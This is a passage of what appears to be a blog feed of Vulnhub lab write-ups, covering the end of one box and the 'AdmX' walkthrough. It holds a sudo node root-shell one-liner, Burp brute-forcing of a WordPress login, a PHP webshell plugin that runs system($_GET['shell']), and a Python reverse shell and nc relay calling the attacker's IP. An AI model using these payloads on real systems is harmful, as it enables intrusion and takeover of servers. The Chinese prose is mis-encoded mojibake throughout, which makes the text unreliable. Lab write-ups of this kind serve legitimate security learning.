<p>è·å¾— imera æƒé™ï¼Œè™½ç„¶ä¸æ˜¯rootï¼Œä½†æ˜¯ä¹Ÿè¶³å¤Ÿè¯»å–å…¶ä¸­ä¸€ä¸ªflagäº†ã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/home/imera/user.txt: </span><br><span class="line">byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK</span><br></pre></td></tr></table></figure></p>
<p>æ¥ä¸‹æ¥è¿˜éœ€è¦ææƒï¼Œå¾—åˆ°rootæƒé™ã€‚è¿™é‡Œä»‹ç»å¸¸ç”¨çš„Linuxææƒçš„ç¬¬ä¸‰ç§ï¼Œsudoé…ç½®ææƒã€‚</p>
<p>æŸ¥çœ‹sudoé…ç½®ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401145800.png" /></p>
<p>æ³¨æ„åˆ°ç”¨æˆ·imeraæ‹¥æœ‰ä¸¤ä¸ªç¨‹åº npmå’Œnodeçš„å…¨éƒ¨æƒé™ï¼Œè¿˜ä¸éœ€è¦å¯†ç ï¼Œå› æ­¤å¯ä»¥åœ¨è¿™é‡Œææƒã€‚</p>
<p>å‚è€ƒæ–‡ç« ï¼šhttps://gtfobins.github.io/gtfobins/node/</p>
<p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo node -e &#x27;child_process.spawn(&quot;/bin/sh&quot;, &#123;stdio: [0, 1, 2]&#125;)&#x27;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401150130.png" /></p>
<p>ææƒæˆåŠŸã€‚</p>
<p>è·å–ç¬¬äºŒä¸ªflagï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/root/root.txt: </span><br><span class="line">YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK</span><br></pre></td></tr></table></figure></p>
<p>è‡³æ­¤ï¼Œæ¸—é€è¿‡ç¨‹ç»“æŸã€‚</p>
<h1 id="å½©è›‹éƒ¨åˆ†">å½©è›‹éƒ¨åˆ†</h1>
<p>å°†ä¸¤ä¸ªflagè§£ç ï¼ˆbase64ï¼‰ï¼Œç„¶åå†æ”¾åˆ°è°·æ­Œå»ç¿»è¯‘ï¼Œå¾—åˆ°å¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401150635.png" /></p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>é€šè¿‡å¯¹è¿™ä¸ªé¶æœºçš„æ¸—é€ï¼Œæœ‰ä»¥ä¸‹å‡ ç‚¹æ„Ÿå—ï¼š</p>
<ol type="1">
<li>å¦‚åŒç¬¬ä¸€æ¬¡æƒé™æå‡çš„æ—¶å€™ï¼Œç»å¸¸ä¼šé‡åˆ°æˆ‘ä»¬ä¸ç†Ÿæ‚‰çš„æŠ€æœ¯ï¼Œè¿™æ—¶å€™å°±éœ€è¦å¤§é‡çš„æœç´¢ï¼Œå¿«é€Ÿå­¦ä¹ ï¼</li>
<li>å­¦ä¹ äº†ç¬¬ä¸‰ç§Linuxææƒçš„æ–¹å¼</li>
<li>node.jsçš„express-fileupload 1.1.7 å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´</li>
</ol>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>ç»¼åˆ</tag>
        <tag>vulnhub</tag>
        <tag>node.jsåŸå‹é“¾æ±¡æŸ“</tag>
        <tag>ncä¸²è”</tag>
      </tags>
  </entry>
  <entry>
    <title>4. Vulnhub AdmX writeup</title>
    <url>/2022/04/03/4.%20Vulnhub%20AdmX%20writeup/</url>
    <content><![CDATA[<p>è¯¥é¶æœºéš¾åº¦ä¸­ç­‰ã€‚</p>
<span id="more"></span>
<h1 id="é¶æœºä¿¡æ¯">é¶æœºä¿¡æ¯</h1>
<p>é¶æœºåœ°å€ï¼š<a href="https://download.vulnhub.com/admx/AdmX_new.7z">https://download.vulnhub.com/admx/AdmX_new.7z</a></p>
<p>éš¾åº¦ï¼šMedium</p>
<p>è™šæ‹Ÿæœºè½¯ä»¶ï¼šVirtual Box</p>
<p>ç›®æ ‡ï¼šå–å¾—2ä¸ªflagï¼Œè·å¾—rootæƒé™</p>
<p><strong>æ¶‰åŠçš„æ”»å‡»æ–¹æ³•</strong>ï¼š</p>
<ul>
<li>ä¸»æœºå‘ç°</li>
<li>ç«¯å£æ‰«æ</li>
<li>webè·¯å¾„çˆ†ç ´ï¼ˆç›®å½•æ‰«æï¼‰</li>
<li>BPè‡ªåŠ¨æ›¿æ¢</li>
<li>å¯†ç çˆ†ç ´</li>
<li>MSFæ¼æ´åˆ©ç”¨</li>
<li>Wordpressæ¼æ´åˆ©ç”¨</li>
<li>NCåå¼¹shellå‡çº§ï¼šncåå¼¹çš„shellæ˜¯æ®‹ç¼ºçš„ï¼Œæ¯”å¦‚ç¼ºå°‘æ–‡ä»¶åè¡¥å…¨ã€‚è¿™ä¸ªæ–¹æ³•å°±æ˜¯è·å¾—å®Œæ•´çš„shellã€‚</li>
<li>èšå‰‘ä¸Šçº¿</li>
<li>åˆ©ç”¨MySQLææƒ</li>
</ul>
<h1 id="é…ç½®ä¿¡æ¯">é…ç½®ä¿¡æ¯</h1>
<p>è¿™é‡Œä½¿ç”¨NATæ¨¡å¼ã€‚é…ç½®å¾ˆç®€å•ï¼Œåªéœ€è¦åœ¨virtual boxä¸­çš„å…¨å±€è®¾å®šä¸­æ·»åŠ ä¸€å¼ ç½‘å¡ï¼Œç„¶åè™šæ‹Ÿæœºé€‰æ‹©NATæ¨¡å¼ï¼Œæ­¤æ—¶ä¼šè‡ªåŠ¨é€‰æ‹©åˆšåˆšåˆ›å»ºçš„ç½‘å¡ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402214433.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402214443.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402214459.png" /></p>
<h1 id="å•ç”¨æˆ·æ¨¡å¼">å•ç”¨æˆ·æ¨¡å¼</h1>
<p>æœ¬é¢˜çš„è™šæ‹Ÿæœºæ— æ³•æ‰«æåˆ°IPã€‚å› æ­¤è¿›å…¥å•ç”¨æˆ·æ¨¡å¼ï¼Œä¿®æ”¹ç½‘å¡åç§°å³å¯ã€‚å…·ä½“å¯ä»¥çœ‹<a href="https://mp.weixin.qq.com/s?__biz=MjM5NjI1OTc5Mw==&amp;mid=2652172616&amp;idx=1&amp;sn=f72eaf0db6af6e9ec68e17ed30479852&amp;chksm=bd0ba3f68a7c2ae09cd08de9006e86c417ac27ca3d11f603aa30d14fe402b2b5cb4bc55a5545&amp;scene=126&amp;&amp;sessionid=1648903615#rd">ä¿®æ”¹ç½‘å¡</a></p>
<p><strong>æ­¥éª¤</strong>ï¼š</p>
<p>åœ¨å¯åŠ¨æˆ–è€…é‡å¯ï¼Œæ˜¾ç¤ºvirtual boxé‚£ä¸ªç•Œé¢ä¹‹åé»‘å±çš„æ—¶å€™ï¼ŒæŒ‰ä½æ–¹å‘é”®ä¸Šï¼Œè¿›å…¥å¦‚ä¸‹ç•Œé¢ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403204842.png" /></p>
<p>æ­¤æ—¶æŒ‰ eï¼Œè¿›å…¥å¦‚ä¸‹ç•Œé¢ï¼Œæ‰¾åˆ°çº¢æ¡†ä½ç½®ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403204947.png" /></p>
<p>å°†çº¢æ¡†çš„å†…å®¹ä¿®æ”¹ä¸ºå¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403205050.png" /></p>
<p>ä¸€å®šè¦æ˜¯ rwï¼Œå¦åˆ™æ— æ³•ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼</p>
<p>ç„¶åæŒ‰<code>ctrl+x</code>æˆ–è€…F10å¯åŠ¨ã€‚ç„¶åè¾“å…¥<code>ip a</code>æŸ¥çœ‹ç½‘å¡ä¿¡æ¯ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403205339.png" /></p>
<p>æŸ¥çœ‹ç½‘ç»œé…ç½®æ–‡ä»¶ä¸­çš„ç½‘å¡åç§°ï¼ˆè¯¥é¶æœºçš„ç³»ç»Ÿæ˜¯Ubuntuï¼Œå› æ­¤é€‰ç¬¬äºŒä¸ªï¼‰ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># RedHat Linux</span><br><span class="line">vi /etc/network/interfaces</span><br><span class="line"></span><br><span class="line"># UBUNTU</span><br><span class="line">vi /etc/netplan/00-installer-config.yaml</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403205436.png" /></p>
<p>å°† ens33 ä¿®æ”¹æˆåŠŸç½‘å¡ä¿¡æ¯ä¸­çš„çº¢æ¡†ä½ç½®çš„åå­—ã€‚ç„¶åä¿å­˜å¹¶é€€å‡ºï¼Œé‡å¯è®¡ç®—æœºå³å¯è·å¾—IPã€‚</p>
<h1 id="æ¸—é€">æ¸—é€</h1>
<p>kaliï¼š10.0.2.4</p>
<h2 id="ä¸»æœºå‘ç°">ä¸»æœºå‘ç°</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sn 10.0.2.0/24</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402214748.png" /></p>
<p>1,2,3å…¶å®éƒ½ä¸æ˜¯ï¼›4æ˜¯kaliï¼Œå› æ­¤é¶æœºIPä¸º10.0.2.5</p>
<h2 id="ç«¯å£æ‰«æ">ç«¯å£æ‰«æ</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p1-65535 10.0.2.5</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402215226.png" /></p>
<p>åªå¼€äº†ä¸€ä¸ª80ç«¯å£</p>
<h2 id="ç«¯å£æœåŠ¡å‘ç°">ç«¯å£æœåŠ¡å‘ç°</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p80 -sV 10.0.2.5</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402215338.png" /></p>
<ol type="1">
<li>é¶æœºç³»ç»Ÿæ˜¯Ubuntu</li>
<li>80ç«¯å£ä¸Šçš„æœåŠ¡æ˜¯http</li>
<li>apache ç‰ˆæœ¬ 2.4.13</li>
</ol>
<h2 id="è®¿é—®httpæœåŠ¡">è®¿é—®httpæœåŠ¡</h2>
<p>è®¿é—®ä¹‹åå‘ç°å°±æ˜¯ä¸€ä¸ªapacheçš„é¡µé¢ï¼Œæ²¡æœ‰å…¶ä»–ä¿¡æ¯ï¼Œå› æ­¤ç›´æ¥è¿›è¡Œwebè·¯å¾„æ‰«æã€‚è¿™é‡Œä½¿ç”¨æ–°çš„å·¥å…·feroxbusterã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">feroxbuster --url http://10.0.2.5</span><br></pre></td></tr></table></figure></p>
<p>ï¼ˆæ³¨æ„ï¼Œå¦‚æœæŠ¥é”™ä»”ç»†çœ‹ä¿¡æ¯ï¼Œå¯èƒ½æ˜¯å› ä¸ºæ²¡æœ‰å­—å…¸ï¼‰</p>
<p>è¯¥å·¥å…·ä¸è‡ªå¸¦å­—å…¸ï¼Œå› æ­¤æœ‰ä¸¤ç§æ–¹æ³•ï¼š</p>
<ul>
<li><code>sudo apt install seclists</code> å®‰è£…å­—å…¸</li>
<li>è‡ªå·±æŒ‡å®šå­—å…¸</li>
</ul>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402222016.png" /></p>
<p>è™½ç„¶éƒ½æ˜¯301ï¼Œä½†æ˜¯301æ˜¯é‡å®šå‘ï¼Œå¹¶ä¸æ˜¯ä¸å­˜åœ¨ï¼Œå› æ­¤å¯ä»¥å°è¯•è®¿é—®ã€‚æ³¨æ„åˆ°ä¸¤ä¸ªä¸œè¥¿ï¼š</p>
<ol type="1">
<li>å‡ºç°äº†å¾ˆå¤šçš„ wordpress</li>
<li>è¿˜æœ‰ä¸€ä¸ªadminï¼Œè¿™ä¸ªå¯èƒ½æ˜¯åå°åœ°å€</li>
</ol>
<p>æˆ‘ä»¬å…ˆè®¿é—® wordpressï¼Œå‘ç°é¡µé¢è¿‡äº†å¾ˆä¹…æ‰åŠ è½½å‡ºæ¥ã€‚è€Œadminæ›´æ˜¯ç›´æ¥æ— æ³•è®¿é—®ã€‚å› æ­¤ï¼Œèšç„¦åœ¨ <code>http://10.0.2.5/wordpress/</code> ä¸Šï¼Œ<strong>è¿™é‡Œèƒ½å¤ŸåŠ è½½å‡ºé¡µé¢ï¼Œä½†æ˜¯é€Ÿåº¦å¾ˆæ…¢ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› æ­¤å°è¯•æŠ“åŒ…çœ‹ä¸€ä¸‹</strong>ã€‚å‘ç°äº†å¼‚å¸¸ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402222458.png" /></p>
<p>æˆ‘ä»¬åªè®¿é—®äº† 10.0.2.5ï¼Œä½†æ˜¯æ•°æ®åŒ…å´å‡ºç°äº† 192.168.159.145ï¼Œè¿™å¹¶ä¸æ˜¯è¯¥ç½‘æ®µçš„IPï¼Œæ­¤æ—¶æƒ³èµ·äº†å‰é¢çš„301ï¼Œå› æ­¤çŒœæµ‹ï¼Œè¿™æ˜¯åå°é‡å®šå‘åˆ°äº†192é‚£ä¸ªIPåœ°å€ã€‚</p>
<p>æŸ¥çœ‹å“åº”åŒ…ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402222730.png" /></p>
<p>å‘ç° 192.168.159.145 æœ‰20ä¸ªåŒ¹é…ï¼Œè¿™è¯´æ˜åå°å°†é‡å®šå‘çš„IPåœ°å€å†™æ­»äº†ã€‚ä¸è®ºè°è®¿é—®10.0.2.5éƒ½ä¼šè¢«é‡å®šå‘åˆ°192.168.159.145ï¼Œè¿™ä¸€çœ‹å°±æ˜¯å†…ç½‘åœ°å€ã€‚<strong>å› æ­¤ï¼Œæ¥ä¸‹æ¥çš„æ€è·¯å°±æ˜¯ä¸è®©é¶æœºè¯·æ±‚192.168.159.145çš„èµ„æºï¼Œè€Œæ˜¯è®©å®ƒè¯·æ±‚10.0.2.5çš„èµ„æº</strong>ã€‚</p>
<h2 id="bpè‡ªåŠ¨æ›¿æ¢">BPè‡ªåŠ¨æ›¿æ¢</h2>
<p>è¿›å…¥BPä¿®æ”¹ä»¥ä¸‹ä¿¡æ¯ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402223246.png" /></p>
<p>æ­¤æ—¶åˆ·æ–°é¡µé¢ï¼ŒæˆåŠŸåŠ è½½ï¼</p>
<p>æ¥ä¸‹æ¥è¿›è¡ŒwebåŠŸèƒ½ç‚¹æµ‹è¯•ï¼Œæµ‹è¯•ä¹‹åå‘ç°ï¼Œæ²¡æœ‰å­˜åœ¨å¯åˆ©ç”¨çš„æ¼æ´ã€‚å¿½ç„¶æƒ³èµ·ä¹‹å‰æœ‰ä¸€ä¸ªwp-adminç›®å½•ï¼Œå°è¯•è®¿é—®ä¸€ä¸‹ã€‚å‡ºç°åå°ç™»å½•ç•Œé¢ï¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402223545.png" /></p>
<h2 id="å¯†ç çˆ†ç ´">å¯†ç çˆ†ç ´</h2>
<p>çœ‹è§ç™»å½•æ¡†ï¼Œé¦–å…ˆå°è¯•ä¸€ä¸‹ä¸‡èƒ½å¯†ç ï¼Œå‘ç°è¡Œä¸é€šã€‚ä½†æ˜¯åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°æœ‰æ—¶å€™ä¼šæç¤º<code>wrong username</code>ï¼Œæœ‰æ—¶å€™å´æç¤º<code>The password you entered for the username **admin** is incorrect.</code>ã€‚è¿™è¯´æ˜å­˜åœ¨ç€adminè¿™ä¸ªç”¨æˆ·ã€‚å¹¶ä¸”æµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°å¯ä»¥éšä¾¿å®éªŒï¼Œæ²¡æœ‰æ¬¡æ•°ã€æ—¶é—´é™åˆ¶ï¼Œä¹Ÿæ²¡æœ‰éªŒè¯ç ï¼Œå› æ­¤å¯ä»¥é‡‡ç”¨å¯†ç çˆ†ç ´ï¼</p>
<p>å¯†ç çˆ†ç ´é¦–å…ˆå¾—çŸ¥é“ç”¨æˆ·åï¼Œæœ‰ä¸¤ä¸ªæ–¹æ³•ï¼š</p>
<ol type="1">
<li>æ ¹æ®æŠ¥é”™ä¿¡æ¯</li>
<li>æœç´¢ç›¸å…³CMSçš„é»˜è®¤ç®¡ç†å‘˜ã€æ™®é€šè´¦æˆ·</li>
</ol>
<p>ä½¿ç”¨BPè¿›è¡Œçˆ†ç ´ï¼Œè¿™é‡Œæ¨èä½¿ç”¨<a href="https://github.com/fuzz-security/SuperWordlist">superwordlist</a>ä¸­çš„MidPwds.txtè¿™ä¸ªå­—å…¸ã€‚ï¼ˆç”±äºè¿™ä¸ªå­—å…¸å¤ªå¤šäº†ï¼Œkaliè‡ªå¸¦çš„BPä¸æ˜¯proï¼Œçˆ†ç ´é€Ÿåº¦å¤ªæ…¢äº†ï¼Œå› æ­¤æˆ‘è‡ªå®šä¹‰äº†100ä¸ªè¿›è¡Œæ¼”ç¤ºï¼‰</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403204448.png" /></p>
<p>å¯ä»¥å‘ç°åªæœ‰adam14çš„å“åº”åŒ…é•¿åº¦ä¸å…¶ä»–çš„ä¸åŒï¼Œå¹¶ä¸”è®¾ç½®äº†è®¸å¤šçš„cookieï¼Œç„¶åé‡å®šå‘åˆ° wp-adminï¼Œå› æ­¤ï¼Œæœ‰ç†ç”±çŒœæµ‹è¿™å°±æ˜¯å¯†ç ï¼Œå›åˆ°ç™»å½•ç•Œé¢å°è¯•ï¼Œå‘ç°ç™»å½•æˆåŠŸï¼å› æ­¤ï¼Œæœ€ç»ˆå‘ç°å¯†ç æ˜¯adam14ã€‚ï¼ˆå¦‚æœæç¤ºéªŒè¯é‚®ç®±é€‰æ‹©å·¦ä¸‹è§’çš„ç¨åæé†’ï¼‰</p>
<h2 id="åå°get-shell">åå°get shell</h2>
<p>åå°get shellçš„æ–¹å¼ä¸€èˆ¬æœ‰ä»¥ä¸‹ä¸‰ç§ï¼ˆæœ¬é¢˜ä¸ºä¾‹ï¼‰ï¼š</p>
<ol type="1">
<li>Mediaé‡Œé¢çš„æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œä¸Šä¼ åé—¨</li>
<li>Appearanceé‡Œthemeæ¨¡æ¿ï¼ˆPHPæ–‡ä»¶ï¼‰çš„ä¿®æ”¹</li>
<li>pluginsä¿®æ”¹ç°æœ‰çš„æ’ä»¶çš„phpï¼Œæˆ–è€…æ‰‹åŠ¨å†™æ’ä»¶ç„¶åä¸Šä¼ ï¼ˆä¸Šä¼ çš„webshellè¦æ‰¾åˆ°è·¯å¾„ï¼‰</li>
</ol>
<h3 id="ç¬¬ä¸€ç§">ç¬¬ä¸€ç§</h3>
<p>ä¸è®ºæ˜¯å¦å…æ€ï¼Œéƒ½æ— æ³•ä¸Šä¼ </p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402231623.png" /></p>
<h3 id="ç¬¬äºŒç§">ç¬¬äºŒç§</h3>
<p>æ³¨æ„åˆ°åˆšè¿›æ¥åå°çš„æ—¶å€™å†™ç€ä½¿ç”¨çš„ä¸»é¢˜æ˜¯<code>Twenty Twenty-One</code>ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402231928.png" /></p>
<p>å‘ç°ä¸å¯ä»¥ä¿®æ”¹æ–‡ä»¶ã€‚</p>
<h3 id="ç¬¬ä¸‰ç§">ç¬¬ä¸‰ç§</h3>
<p>æ¨èè‡ªå·±å†™ä¸€ä¸ªæ’ä»¶ç„¶åä¸Šä¼ ã€‚å¦‚æœæ²¡æœ‰ä¸Šä¼ åŠŸèƒ½ï¼Œé‚£å°±ä¿®æ”¹ç°æœ‰æ’ä»¶ã€‚è¿™é‡Œæœ‰ä¸Šä¼ åŠŸèƒ½ã€‚</p>
<p>å…ˆæŸ¥çœ‹ç°æœ‰çš„ä¸¤ä¸ªæ’ä»¶çš„å†™æ³•ï¼Œå‘ç°æœ‰ä¸€ä¸ªå…±åŒç‚¹ï¼Œé‚£å°±æ˜¯å¤´æ–‡ä»¶ï¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402232516.png" /></p>
<p>å¾—åŒ…å«è¿™äº›ä¸œè¥¿</p>
<p>å› æ­¤ï¼Œå†™ä¸€ä¸ªå¦‚ä¸‹æ’ä»¶ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Plugin Name: webshell</span></span><br><span class="line"><span class="comment">* Plugin URI: https://hdfzzf.github.io</span></span><br><span class="line"><span class="comment">* Descritption: WP webshell for pentest</span></span><br><span class="line"><span class="comment">* Version: 1.0</span></span><br><span class="line"><span class="comment">* Author: hdfzzf</span></span><br><span class="line"><span class="comment">* Author URI: https://hdfzzf.github.io</span></span><br><span class="line"><span class="comment">* License: https://hdfzzf.github.io</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	system(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>ï¼ˆç»è¿‡æµ‹è¯•ï¼Œå¦‚æœä¸å†™å¤´éƒ¨ä¿¡æ¯ï¼Œæ’ä»¶å®‰è£…ä¼šä¸æˆåŠŸï¼‰</p>
<p>å®‰è£…æˆåŠŸåéœ€è¦æ¿€æ´»æ’ä»¶</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402233227.png" /></p>
<p>ç°åœ¨éœ€è¦çŸ¥é“æ’ä»¶ä¸Šä¼ ä¹‹åçš„è·¯å¾„ã€‚ç½‘ç»œæœç´¢å‘ç°è¯¥CMSæ’ä»¶çš„è·¯å¾„æ˜¯<code>/wordpress/wp-content/plugins/</code>ã€‚å› æ­¤è®¿é—®<code>10.0.2.5/wordpress/wp-content/plugins/shell.php?shell=id</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402234611.png" /></p>
<p>æˆåŠŸæ‰§è¡Œäº†å‘½ä»¤ã€‚</p>
<p>è¿™é‡Œå¯ä»¥ä½¿ç”¨ï¼š</p>
<ol type="1">
<li>pythonåå¼¹shell</li>
<li>ncæ‹¿shell</li>
<li>msf</li>
</ol>
<p>kaliç›‘å¬ 3333 ç«¯å£ï¼Œç„¶åç½‘é¡µè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>ä¹Ÿå¯ä»¥é€šè¿‡ncä¸²è”ï¼š</p>
<p>kaliç›‘å¬ä¸¤ä¸ªç«¯å£ï¼Œç„¶åç½‘é¡µæ‰§è¡Œä¸‹é¢ å‘½ä»¤ï¼š <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc 10.0.2.4 3333|/bin/bash|nc 10.0.2.4 4444</span><br></pre></td></tr></table></figure></p>
<p>ä¸è¿‡è¿™é‡Œå†ä»‹ç»ä¸€ç§ï¼Œé‚£å°±æ˜¯msfåå¼¹shellã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. msfconsole  å¯åŠ¨msf</span><br><span class="line">2. search wordpress admin</span><br><span class="line">3. use 2  é€‰æ‹©ç¬¬äºŒä¸ª</span><br><span class="line">4. show options</span><br><span class="line">5. è®¾ç½®å‚æ•°</span><br><span class="line">6. run</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402235756.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402235736.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402235840.png" /></p>
<p>æˆåŠŸï¼</p>
<h2 id="shellå‡çº§">shellå‡çº§</h2>
<p>ææƒè·å¾—çš„shellæ˜¯æ®‹ç¼ºçš„ï¼Œæ— æ³•å®Œæˆäº’åŠ¨æ“ä½œï¼Œæ¯”å¦‚ä¿®æ”¹ä»£ç ï¼Œè‡ªåŠ¨è¡¥é½ã€‚å› æ­¤ï¼Œæ¥ä¸‹æ¥éœ€è¦å‡çº§ï¼ˆä»¥python get shellåšç¤ºèŒƒã€‚è¯¥æ–¹æ³•åªé’ˆå¯¹bashï¼‰ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. python3Â -cÂ &#x27;importÂ pty;Â pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">2. ctrl+z å°†è·å¾—çš„shellæš‚åœï¼Œåˆ‡åˆ°åå°</span><br><span class="line">3. stty raw -echo</span><br><span class="line">4. fg å°†åˆšåˆšæ”¾å…¥åå°çš„è¿›ç¨‹åˆ‡åˆ°å‰å°</span><br><span class="line">5. export SHELL=/bin/bash</span><br><span class="line">6. export TERM=screen</span><br><span class="line">7. stty rows 38 columns 116 è®¾ç½®å¤§å°</span><br><span class="line">8. reset</span><br><span class="line">9. shellæˆåŠŸå‡çº§</span><br><span class="line"></span><br><span class="line">æ³¨æ„ï¼šå¦‚æœkaliä½¿ç”¨çš„æ˜¯zshï¼Œéœ€è¦åˆ‡æ¢ä¸ºbashã€‚</span><br><span class="line">	1. chsh -s /bin/bashï¼ˆä¸èƒ½åŠ sudoï¼Œå¦åˆ™ä¿®æ”¹çš„æ˜¯rootçš„shellï¼‰</span><br><span class="line">	2. é‡å¯</span><br><span class="line">	3. echo $SHELL ç¡®è®¤ä¸€ä¸‹</span><br></pre></td></tr></table></figure></p>
<p><strong>å¦‚æœåˆ©ç”¨ncè·å¾—ä¸€ä¸ªshellï¼Œå®¹æ˜“ä¸å°å¿ƒæŒ‰ctrl+cæˆ–è€…æŸç§åŸå› é€€å‡ºäº†shellã€‚å¹¶ä¸”ï¼Œæœ‰çš„webç¨‹åºä¸èƒ½å¤šæ¬¡è§¦å‘æ¼æ´åå¼¹shellï¼ˆå¯èƒ½è§¦å‘ä¸€æ¬¡åç¯å¢ƒå°±å˜äº†ï¼Œåªèƒ½ç­‰å¾…å¯¹æ–¹é‡å¯æœåŠ¡å™¨ï¼‰ã€‚å› æ­¤ï¼Œè·å¾—ä¸€ä¸ªshellåï¼Œåº”è¯¥åŸºäºè¿™ä¸ªshellå»è·å¾—2-3ä¸ªshellï¼Œæ¯”å¦‚ä¸€å¥è¯æœ¨é©¬</strong></p>
<p>å›æƒ³åˆšåˆšåå°get shellçš„ç¬¬äºŒç§æ–¹æ³•ï¼Œæ­¤æ—¶å·²ç»è·å¾—äº†shellï¼Œå› æ­¤å¯ä»¥ä¿®æ”¹phpæ–‡ä»¶ï¼ˆæˆ–è€…æ·»åŠ phpæ–‡ä»¶ï¼‰æ¥ç”¨å…¶ä»–å·¥å…·è¿æ¥ï¼Œæ¯”å¦‚èšå‰‘ã€‚</p>
<p>è¿™é‡Œä¿®æ”¹ä¸»é¢˜é‡Œé¢çš„404.phpæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯åˆšåˆšä¿®æ”¹ä¸æˆåŠŸçš„é‚£ä¸ªã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403193531.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403202613.png" /></p>
<p>æˆåŠŸè¿æ¥</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403202630.png" /></p>
